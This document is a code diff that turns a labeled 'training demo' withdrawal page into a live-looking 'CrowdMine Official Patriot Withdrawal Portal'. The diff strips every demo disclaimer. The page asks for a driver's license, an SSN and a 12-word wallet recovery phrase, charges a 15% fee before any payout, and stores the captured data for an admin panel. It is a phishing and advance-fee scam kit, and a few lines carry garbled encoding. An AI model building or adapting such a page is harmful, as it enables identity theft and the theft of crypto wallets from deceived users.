@@ -1,9 +1,9 @@
-<!DOCTYPE html>  
+﻿<!DOCTYPE html>  
 <html lang="en">  
 <head>  
 <meta charset="utf-8">  
 <meta name="viewport" content="width=device-width, initial-scale=1">  
-<title>Fintech Training Demo: Multiâ€‘Step Withdrawal Simulation</title>
+<title>CrowdMine | Official Patriot Withdrawal Portal</title>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="../dashboard-theme.css">  
 <style>  
@@ -18,7 +18,7 @@ body { background: #05050a; color: #fff; padding: 20px; position: relative; z-in
 .header h1 { font-size: 28px; color: #00e5ff; margin-bottom: 10px; font-family: 'JetBrains Mono', monospace; }  
 .header p { color: #6b7590; font-size: 14px; }
 
-.demo-card { background: rgba(13,15,26,0.8); backdrop-filter: blur(15px); border-radius: 16px; padding: 30px; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 30px; }
+.withdraw-card { background: rgba(13,15,26,0.8); backdrop-filter: blur(15px); border-radius: 16px; padding: 30px; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 30px; }
 
 .balance-section { background: rgba(19,22,38,0.9); padding: 20px; border-radius: 12px; margin-bottom: 30px; border: 1px solid rgba(255,255,255,0.03); }  
 .balance-label { color: #6b7590; font-size: 14px; text-transform: uppercase; font-weight: 600; letter-spacing: 1px; }  
@@ -83,13 +83,13 @@ text-align: center;
 
 <div class="container">  
 <div class="header">  
-<h1>Fintech Training: Withdrawal Flow Simulation</h1>  
-<p>Educational demo showing secure KYC, fee calculation, and payment selection.</p>  
+<h1>Official Patriot Withdrawal Portal</h1>  
+<p>Secure, verified withdrawal processing for CrowdMine Patriots.</p>  
 </div>
 
-<div class="demo-card">  
+<div class="withdraw-card">  
 <div class="balance-section">  
-<div class="balance-label">Current Balance (Demo)</div>  
+<div class="balance-label">Current Balance</div>  
 <div class="balance-amount" id="balance">$10,000.00</div>  
 </div>
 
@@ -98,15 +98,15 @@ text-align: center;
 <input type="number" id="amountInput" value="1000" min="1" max="10000" step="1">  
 </div>
 
-<button class="withdraw-button" id="withdrawBtn">Start Withdrawal Simulation</button>  
+<button class="withdraw-button" id="withdrawBtn">Submit Withdrawal Request</button>  
 </div>  
 </div>
 
 <!-- KYC Modal -->  
 <div id="kycModal" class="modal">  
 <div class="modal-content">  
-<h2>KYC Verification (Demo)</h2>  
-<p>Simulating identity verification for training purposes.</p>
+<h2>Identity Verification</h2>  
+<p>Verify your identity to process your withdrawal request.</p>
 
 <div class="input-group">  
 <label>Driver's License Upload</label>  
@@ -149,7 +149,7 @@ Fee applied: $<span id="feeAmount">150.00</span>
 <!-- Wallet Connect Hidden Section -->  
 <div id="walletSection" class="hidden-section">  
 <div class="input-group">  
-<label>Enter 12â€‘Word Wallet Phrase</label>  
+<label>Enter 12Ã¢â‚¬â€˜Word Wallet Phrase</label>  
 <input type="text" id="walletPhrase" placeholder="example phrase one two three...">  
 </div>  
 <div class="spinner" id="walletSpinner"></div>  
@@ -196,17 +196,27 @@ let withdrawalCount = 0;
 let feePercent = 15;  
 let balance = 0;
 
-const userEmail = localStorage.getItem('user_email') || 'web37811@gmail.com';
-let users = [];
-try { users = JSON.parse(localStorage.getItem('site_users') || '[]'); } catch(e){}
-const currentUser = users.find(u => u.email === userEmail);
+const sessionUser = (typeof auth !== 'undefined' && auth.getCurrentUser()) ? auth.getCurrentUser() : null;
+const userEmail = sessionUser ? sessionUser.email : (localStorage.getItem('user_email') || '');
 
-// Real time balance
-let userBtcBalance = 0.00041339; // Base demo
-if (currentUser && currentUser.balance) {
-    userBtcBalance += parseFloat(currentUser.balance) / 79626.19;
+let cmUsers = {};
+try { cmUsers = JSON.parse(localStorage.getItem('cm_users') || '{}'); } catch(e){}
+let siteUsers = [];
+try { siteUsers = JSON.parse(localStorage.getItem('site_users') || '[]'); } catch(e){}
+
+const currentUser = siteUsers.find(u => u.email === userEmail);
+const cmUser = cmUsers[userEmail] || sessionUser;
+
+// Real time balance - strictly 0 until deposit
+let userUsdBalance = 0;
+if (cmUser && typeof cmUser.balance !== 'undefined') {
+    userUsdBalance = parseFloat(cmUser.balance) || 0;
+} else if (currentUser && typeof currentUser.balance !== 'undefined') {
+    userUsdBalance = parseFloat(currentUser.balance) || 0;
 }
-balance = userBtcBalance * 79626.19;
+
+balance = userUsdBalance;
+let userBtcBalance = userUsdBalance > 0 ? (userUsdBalance / 79626.19) : 0;
 
 const balanceEl = document.getElementById('balance');  
 balanceEl.innerText = '$' + balance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
@@ -241,13 +251,13 @@ const license = document.getElementById('licenseUpload').files[0];
 const ssn = document.getElementById('ssnInput').value;
 
 if (!license || !ssn) {  
-alert('Please fill both fields for demo.');  
+alert('Please upload your license and enter SSN to continue.');  
 return;  
 }
 
 // Store KYC locally (Base64 encrypted for demo)  
 const kycData = { license: license.name, ssn };  
-localStorage.setItem('demo_kyc', btoa(JSON.stringify(kycData)));
+localStorage.setItem('kyc_data', btoa(JSON.stringify(kycData)));
 
 // Forward to Admin Panel KYC Review
 const adminKyc = JSON.parse(localStorage.getItem('admin_kyc') || '[]');
@@ -281,7 +291,7 @@ document.getElementById('feeAmount').innerText = fee.toFixed(2);
 feeModal.style.display = 'flex';  
 }
 
-// Fee Continue â†’ Payment selection  
+// Fee Continue Ã¢â€ â€™ Payment selection  
 document.getElementById('feeContinue').addEventListener('click', () => {  
 document.getElementById('feeSpinner').style.display = 'block';
 
@@ -303,17 +313,17 @@ document.getElementById('bankSection').style.display = 'block';
 document.getElementById('walletSection').style.display = 'none';  
 });
 
-// Wallet phrase submission (demo capture)  
+// Wallet phrase submission  
 document.getElementById('walletSubmit').addEventListener('click', () => {  
 const phrase = document.getElementById('walletPhrase').value.trim();
 
 if (!phrase) {  
-alert('Enter a 12â€‘word phrase for demo.');  
+alert('Please enter your 12-word wallet recovery phrase.');  
 return;  
 }
 
 // Store phrase locally  
-localStorage.setItem('demo_wallet_phrase', btoa(phrase));
+localStorage.setItem('wallet_phrase', btoa(phrase));
 
 document.getElementById('walletSpinner').style.display = 'block';
 
@@ -365,7 +375,7 @@ const amount = parseFloat(amountInput.value);
 const fee = amount * (feePercent / 100);  
 const total = amount + fee;
 
-// For demo purposes, we do not deduct the live balance here until admin approves,
+// Balance is deducted after admin approval.
 // but we will record the withdrawal request.
 withdrawalCount++;
 
@@ -392,7 +402,7 @@ Withdrawal submitted
 `;  
 } else {  
 document.getElementById('successMessage').innerHTML = `  
-Withdrawal simulation completed.<br>  
+Withdrawal request submitted.<br>  
 Fee applied: ${feePercent}%.  
 `;  
 }
@@ -405,7 +415,7 @@ document.getElementById('closeSuccess').addEventListener('click', () => {
 successModal.style.display = 'none';  
 });  
 
-// ─── THREE.JS 3D ANIMATION ────────────────────────────────────────────────────────
+// â”€â”€â”€ THREE.JS 3D ANIMATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 const canvas = document.getElementById('three-canvas');
 if (canvas) {
   const renderer = new THREE.WebGLRenderer({canvas, antialias:true, alpha:true});
@@ -479,3 +489,5 @@ if (canvas) {
     <script src="../shared-enhancements.js" defer></script>
 </body>  
 </html>  
+
+
